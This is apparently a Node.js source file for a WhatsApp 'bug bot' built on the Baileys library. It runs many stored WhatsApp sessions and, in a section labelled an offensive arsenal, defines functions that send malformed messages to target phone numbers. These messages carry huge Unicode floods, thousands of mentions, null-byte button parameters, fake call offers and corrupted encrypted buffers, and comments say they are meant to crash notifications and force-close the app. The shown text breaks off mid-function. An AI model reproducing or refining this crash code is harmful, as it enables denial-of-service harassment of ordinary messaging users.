const fs = require('fs');
const path = require('path');
const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto,
    jidEncode,
    jidDecode,
    encodeWAMessage,
    encodeSignedDeviceIdentity
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const { logger } = require('../utils/logger');
const { safeStringify } = require('../utils/serialize_helper');
const crypto = require('crypto');

// Global State
const activeConnections = {};
const biz = {};
const mess = {};

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isVipOrOwner(user) {
  return user && ["vip", "dev", "owner"].includes(user.role);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==========================================
// SESSION MANAGEMENT: VIP
// ==========================================

function getVipSessionPath(sessionName) {
  return path.join('./vip', sessionName);
}

function prepareVipSessionFolders() {
  const vipFolder = './vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
      logger.info("Folder session VIP dibuat.");
    }

    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);

      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');

      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Error menyiapkan folder session VIP:", err.message);
    return [];
  }
}

async function connectVipSession(sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          logger.info(`[VIP ${sessionName}] Terhubung ✅`);

          const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.warn(`[VIP ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
             logger.error(`[VIP ${sessionName}] Session Invalid/Overwrite.`);
             delete activeConnections[sessionName];
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectVipSession(sessionName, retries - 1));
          } else {
            logger.error(`[VIP ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[VIP ${sessionName}] Gagal memuat: ${err.message}`);
      resolve();
    }
  });
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[VIP] Memulai ${files.length} session VIP/Owner...`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectVipSession(baseName);
  }
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
}

function isVipSession(sessionName) {
  return fs.existsSync(getVipSessionPath(sessionName));
}

function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  if (sessionNames.length === 0) return null;
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// ==========================================
// SESSION MANAGEMENT: REGULAR (MEMBER)
// ==========================================

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error prepareAuthFolders: " + err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = path.join(folderPath, sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          logger.info(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logger.info(`[${sessionName}] Logged out.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[${sessionName}] Error: ${err.message}`);
      resolve();
    }
  });
}

function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);

    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      const sock = vipConnections[randomSession];
      // Validasi socket masih terhubung dan punya user info
      if (sock && sock.user && sock.user.id && sock.ws && typeof sock.relayMessage === 'function') {
        logger.info(`[✅ VIP Session] ${randomSession} valid (user: ${sock.user.id})`);
        return sock;
      }
      logger.warn(`[⚠️] VIP session ${randomSession} tidak valid (user: ${sock?.user?.id || 'none'}), menghapus...`);
      delete activeConnections[randomSession];
      delete biz[randomSession];
      delete mess[randomSession];
    }
  }

  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) {
    logger.warn(`[⚠️] Folder ${folderPath} tidak ditemukan`);
    return null;
  }

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  if (jsonFiles.length === 0) {
    logger.warn(`[⚠️] Tidak ada file JSON di ${folderPath}`);
    return null;
  }

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    const sock = activeConnections[sessionName];
    
    if (!sock) {
      logger.warn(`[⚠️] Session ${sessionName} ada di file tapi tidak di activeConnections`);
      continue;
    }
    
    // Validasi socket memiliki method dan user info yang diperlukan
    if (sock.user && sock.user.id && typeof sock.relayMessage === 'function' && sock.authState && sock.authState.creds) {
      logger.info(`[✅ Session] ${sessionName} valid (user: ${sock.user.id})`);
      return sock;
    }
    
    logger.warn(`[⚠️] Session ${sessionName} tidak valid (hasUser: ${!!sock.user}, userId: ${sock.user?.id || 'none'}, hasRelayMessage: ${typeof sock.relayMessage === 'function'}), menghapus...`);
    delete activeConnections[sessionName];
    delete biz[sessionName];
    delete mess[sessionName];
  }
  
  logger.error(`[❌] Tidak ada session valid di ${subfolderName}`);
  return null;
}

async function startUserSessions() {
  try {
    await startVipSessions();

    if (!fs.existsSync('permenmd')) {
        fs.mkdirSync('permenmd');
    }

    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => fs.statSync(p).isDirectory());

    logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder member di 'permenmd'`);

    for (const folder of subfolders) {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          continue;
        }

        connectSession(folder, sessionName).catch(err => {
             logger.error(`Gagal start session member ${sessionName}: ${err.message}`);
        });
      }
    }
  } catch (err) {
    logger.error("Fatal error in startUserSessions: " + err.message);
  }
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logger.info(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
    }
    delete activeConnections[sessionName];
  }
  logger.info('✅ Semua sesi dari activeConnections berhasil disconnect.');
}


// ==========================================
// BUG & ATTACK FUNCTIONS (Use with Caution)
// ==========================================
// ... (Bagian atas file tetap sama hingga Helper Functions)

// ==========================================
// ARSENAL OFENSIF VVIP (CRASH & FC)
// ==========================================

/**
 * [1] CRASH NOTIFIKASI
 * Target: Android/iOS Notification Manager.
 * Mekanisme: Eksploitasi buffer overflow pada rendering pratinjau PaymentInvite.
 */
async function crashNotificationVVIP(sock, target) {
    const payload = "ꦾ".repeat(65000); // Ukuran optimasi anti-socket-closed
    try {
        if (!sock || sock.ws.readyState !== 1) return;

        const msg = {
            viewOnceMessage: {
                message: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: 999999999999999, 
                        noteMessage: {
                            extendedTextMessage: {
                                text: `‼️⃟ ༚ ./𝐃𝐚𝐫𝐤-𝐀𝐢.𝐯𝐯𝐢𝐩   ${payload}`,
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555${i}@s.whatsapp.net`),
                                    externalAdReply: {
                                        showAdAttribution: true,
                                        title: payload,
                                        mediaType: 1,
                                        thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                                        sourceUrl: "https://t.me/CRPTZDX"
                                    },
                                    forwardingScore: 999,
                                    isForwarded: true
                                }
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, { 
            participant: { jid: target }, 
            messageId: sock.generateMessageTag() 
        });
        logger.info(`[🚀] Notification Crash dikirim ke ${target}`);
    } catch (err) {
        logger.error(`[❌] Gagal kirim Notif Crash: ${err.message}`);
    }
}

async function uno(sock, target) {
     const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "AYAM" + "ោ៝".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                        ],
                    },
                },
            },
        },
        {}
    );
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "DRAPOK",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -929.03499999999999,
                                degreesLongitude: 992.999999999999,
                                name: "ZERO",
                                address: "ោ៝".repeat(1000),
                            },
                        },
                        body: {
                            text: "HELLO".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    await sock.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
}

/**
 * [3] FORCE CLOSE (MENTAL)
 * Target: Memory Heap / Dalvik VM.
 * Mekanisme: Heap overflow via malformed CallLog participants array.
 */
async function forceCloseMentalVVIP(sock, target) {
    const trigger = "ꦾ".repeat(55000); 
    try {
        if (!sock || sock.ws.readyState !== 1) return;

        const msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            quotedMessage: {
                                callLogMessage: {
                                    isVideo: false,
                                    callOutcome: "ONGOING",
                                    durationSecs: "0",
                                    callType: "VOICE_CHAT",
                                    participants: Array.from({ length: 8000 }, () => ({
                                        jid: `1${Math.floor(Math.random() * 9999999)}@s.whatsapp.net`,
                                        callOutcome: "CONNECTED"
                                    }))
                                }
                            },
                            externalAdReply: {
                                title: "‼️⃟ ༚ ./𝐃𝐚𝐫𝐤-𝐀𝐢.𝐯𝐯𝐢𝐩",
                                body: trigger,
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                showAdAttribution: false
                            }
                        },
                        body: { text: trigger },
                        nativeFlowMessage: { 
                            messageParamsJson: "{".repeat(10000) 
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, { 
            participant: { jid: target }, 
            messageId: sock.generateMessageTag() 
        });
        logger.info(`[🚀] Force Close dikirim ke ${target}`);
    } catch (err) {
        logger.error(`[❌] Gagal kirim Force Close: ${err.message}`);
    }
}

async function invisibleSpam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

async function newsw(sock, target) {
var msg = generateWAMessageFromContent(target, {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
    "fileLength": "231536",
    "seconds": 88888888,
    "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
    "caption": "x",
    "height": -99999,
    "width": 99999,
    "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
    "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1771576607",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "VIDEO",
      "remoteJid": " #xrellyspec ",
      "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
      "businessMessageForwardInfo": {
        "businessOwnerJid": "13135550202@s.whatsapp.net",
        "businessDescription": null
      },
      "featureEligibilities": {
        "canBeReshared": true
      },
      "isForwarded": true,
      "forwardingScore": 9999,
      "statusAttributions": [
        {
          "type": "MUSIC",
          "externalShare": {
            "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
            "source": "INSTAGRAM",
            "duration": 999999999,
            "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
          }
        }
      ]
    },
    "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
    "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
    "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
    "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
    "annotations": [
      {
        "shouldSkipConfirmation": true,
        "embeddedContent": {
          "embeddedMessage": {
            "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
            "message": {
              "extendedTextMessage": {
                "text": " xrelly6core # ",
                "previewType": "NONE",
                "inviteLinkGroupTypeV2": "DEFAULT"
              },
              "messageContextInfo": {
                "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                "messageAssociation": {
                  "associationType": 18,
                  "parentMessageKey": {
                    "remoteJid": "status@broadcast",
                    "fromMe": false,
                    "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                    "participant": "13135550202@s.whatsapp.net"
                  }
                }
              }
            }
          }
        },
        "embeddedAction": true
      }
    ],
    "externalShareFullVideoDurationInSeconds": 8
  }
}, {})

  let JsonExp2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " is back?! ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );

  await VxoZap.relayMessage('status@broadcast', msg.message, {
    statusJidList: [target]
  });
  
  await VxoZap.relayMessage('status@broadcast', JsonExp2.message, {
    statusJidList: [target]
  });
}

async function permenCall(sock, toJid, isVideo = true) {
  // jidEncode dan encodeSignedDeviceIdentity sudah diimport di atas
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);
  const encKey = crypto.randomBytes(32);
  
  // Pastikan getUSyncDevices tersedia
  if (!sock.getUSyncDevices) return { error: "Socket tidak mendukung USync" };

  try {
      const devices = (await sock.getUSyncDevices([toJid], true, false))
        .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

      await sock.assertSessions(devices, true);

      const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
        call: { callKey: new Uint8Array(encKey) }
      }, { count: '2' });

      const offerContent = [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ].filter(Boolean);

      const stanza = {
        tag: 'call',
        attrs: {
          id: sock.generateMessageTag(),
          from: sock.user.id,
          to: toJid
        },
        content: [{
          tag: 'offer',
          attrs: {
            'call-id': callId,
            'call-creator': sock.user.id
          },
          content: offerContent
        }]
      };

      await sock.query(stanza);
      return { id: callId, to: toJid };
  } catch (err) {
      logger.error("❌ Error permenCall:", err.message);
      return { error: err.message };
  }
}

async function GroupCrashUi(sock, target) {
  try {
    const jid = target.includes("@g.us")
      ? target
      : target.replace(/@.+$/, "@g.us");

    const extendedTextMsg = {
      extendedTextMessage: {
        text: "LexzyIsHere!!",
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          externalAdReply: {
            title: "LexzyModss",
            body: "Test message",
            thumbnailUrl: "https://github.com/LexzyModss/",
            sourceUrl: "https://github.com/LexzyModss/",
            mediaType: 1
          }
        }
      }
    };

    await sock.relayMessage(jid, extendedTextMsg, {
      participant: jid
    });

  } catch (err) {
    console.error("Error GroupCrashUi:", err);
  }
}

async function pay(sock, target) {
  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false,
            },
            body: {
              text: 'cv by nor',
            },
            footer: {
              footerText: '\u0000'.repeat(1000),
            },
            nativeFlowMessage: {
              buttons: [
  { 
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "\u0000".repeat(10000),
sections: [{ title: "", rows: [] }]
})
},
{
name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: "𑜦𑜠".repeat(10000),
 id: null
 })
}, 
  {
    name: 'galaxy_message',
    buttonParamsJson: JSON.stringify({}),
  },
  {
        name: "group_invite",
        buttonParamsJson: JSON.stringify({
            group_jid: null,
            invite_code: `p${Math.random().toString().slice(2, 64)}`,
            display_text: "ꦽ".repeat(10000), 
        })
    },
    {
        name: "video_call",
        buttonParamsJson: JSON.stringify({
            display_text: "ꦽ".repeat(10000), 
        })
    },
    {
        name: "live_location",
        buttonParamsJson: JSON.stringify({
            display_text: "ꦽ".repeat(10000),
        })
    },
  {
    name: 'review_and_pay',
    buttonParamsJson: JSON.stringify({
      currency: "1",
      total_amount: { value: Date.now() + 999999, offset: 99999 },
      type: 2,
      transaction_id: null,
    }),
  },
], 
              messageParamsJson: "}".repeat(5000), 
            },
            contextInfo: {
              stanzaId: null,
              remoteJid: 'status@broadcast',
              isForwarded: true,
              forwardingScore: 9799,
              mentionedJid: [
                ...Array.from({ length: 1900 }, (_, p) => `86705131476${p}@bot`),
                target,
                '0@s.whatsapp.net',
              ],
              quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 710899
}
}, 
            },
          },
        },
      },
    }, {
      messageId: null,
      participant: { jid: target },
    });
    console.log('done');
  } catch (e) {
    console.log('error:', e.message);
  }
}

async function xvar(sock, target) {
const mark = () => Math.random().toString().slice(2, 8) + Date.now().toString().slice(-64);
  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "la u nape" + "ꦾ".repeat(60000) },
            header: {
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: 254515607254515602025.843324832,
                degreesLongitude: 254515607254515602025.843324832,
                name: `nortexz${"ꦾ".repeat(500)}`,
                address: mark(),
                url: `https://wa.me/official/NortexZ/${mark()}`,
                comment: `https://wa.me/${mark()}/settings`,
                jpegThumbnail: Buffer.concat([
                  Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
                  Buffer.alloc(50000, 1)
                ]),
              },
            },
            footer: { footerText: 'exCepNull' },
            nativeFlowMessage: {
              buttons: [
                {
  name: 'single_select',
  buttonParamsJson: JSON.stringify({
    title: "\u0000".repeat(100),
  })
}, 
{ 
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(15000), id: null })
  },
  { 
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(15000), id: null })
  },
  { 
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(15000), id: null })
  },
  { 
    name: "cta_copy",
    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(15000), copy_code: null })
  },
  { 
    name: "cta_url",
    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(15000), url: "https://t.me/NortexZ" })
  },
  { 
    name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  flow_cta: "ꦾ".repeat(20000),
                  header: "ꦾ".repeat(20000),
                  body:"ꦾ".repeat(20000),
                  flow_action_payload: { screen: "FORM_SCREEN" },
                  flow_id: null,
                  flow_message_version: "3",
                  flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                }),
                    nativeFlowInfo: {
          name: "address_message",
          paramsJson: JSON.stringify({
            addressMessage: null
          })
          }}, 
              ],
              messageParamsJson: '}'.repeat(1000),
              messageVersion: 3,
            },
            contextInfo: {
              stanzaId: mark(),
              remoteJid: 'status@broadcast',
              isForwarded: true,
              forwardingScore: 999,
              mentionedJid: [
                ...Array.from({ length: 1900 }, (_, p) => `86705131476${p}@bot`),
                target,
                '0@s.whatsapp.net',
              ],
              quotedMessage: { 
              conversation: "ꦾ".repeat(15000)
                }, 
             forwardedNewsletterMessageInfo: {
              newsletterJid: "120363408414908738@newsletter",
              newsletterName: "\u0000",
              serverMessageId: 1000,
              accessibilityText: "\u0000"
            },
            },
          },
        },
      },
    }, {
      messageId: null, 
    });
  } catch (e) {
    console.log(':', e.message);
  }
}

async function CrashUi(sock, target) {
    const targetJid = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
    const payload = "ꦽ".repeat(50000); 

    try {
        if (!sock || sock.ws.readyState !== 1) return;

        const msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "‼️⃟ ༚ ./𝐃𝐚𝐫𝐤-𝐀𝐢.𝐯𝐯𝐢𝐩",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "MIJUK " + payload
                        },
                        footer: {
                            text: payload
                        },
                        collectionMessage: {
                            bizJid: targetJid,
                            id: payload,
                            version: 1,
                            itemCount: 999999
                        },
                        contextInfo: {
                            mentionedJid: [targetJid, "33922389954766@lid"],
                            forwardingScore: 999,
                            isForwarded: true,
                            externalAdReply: {
                                title: payload,
                                body: "C r a s h . U I",
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                showAdAttribution: true
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(targetJid, msg, {
            participant: { jid: targetJid },
            messageId: sock.generateMessageTag(),
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: targetJid } }]
                        }
                    ]
                }
            ]
        });

        console.log(`Crash UI Injected to ${target.split('@')[0]}`);
    } catch (err) {
    }
}

async function CallLog(Yuukey, target) {
    const { jidDecode, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");

    // 1. Dapatkan semua identitas device target untuk saturasi serangan
    let devices = (
        await Yuukey.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await Yuukey.assertSessions(devices);

    // 2. Generator Buffer Ilegal: Menambahkan byte yang memicu overflow pada dekripsi Signal
    let malformedBuffer = buf => Buffer.concat([
        Buffer.from(buf), 
        Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]), // Suffix pemicu error parser
        Buffer.alloc(2048, 0) // Padding tambahan untuk pengurasan RAM saat render notifikasi
    ]);

    // 3. Modifikasi createParticipantNodes untuk injeksi muatan berat ke tiap jalur device
    const destinations = await Promise.all(devices.map(async (jid) => {
        // Payload teks ekstrem di dalam pratinjau panggilan
        const crashPayload = { 
            conversation: "☠️".repeat(5000),
            contextInfo: { forwardingScore: 999, isForwarded: true }
        };
        
        const bytes = malformedBuffer(Yuukey.encodeWAMessage(crashPayload));
        
        // Eksekusi enkripsi unik untuk tiap node tujuan
        const { type, ciphertext } = await Yuukey.signalRepository.encryptMessage({ jid, data: bytes });
        
        return {
            tag: 'to',
            attrs: { jid },
            content: [{ 
                tag: 'enc', 
                attrs: { v: '2', type, count: '0' }, 
                content: ciphertext 
            }]
        };
    }));

    // 4. Konstruksi Stanza Call Offer dengan Malformed Capability
    let stanza = {
        tag: "call",
        attrs: { 
            to: target, 
            id: Yuukey.generateMessageTag(), 
            from: Yuukey.user.id 
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
                "call-creator": Yuukey.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "net", attrs: { medium: "3" } },
                // Capability ekstrem: Menyerang negosiasi codec target
                { 
                    tag: "capability", 
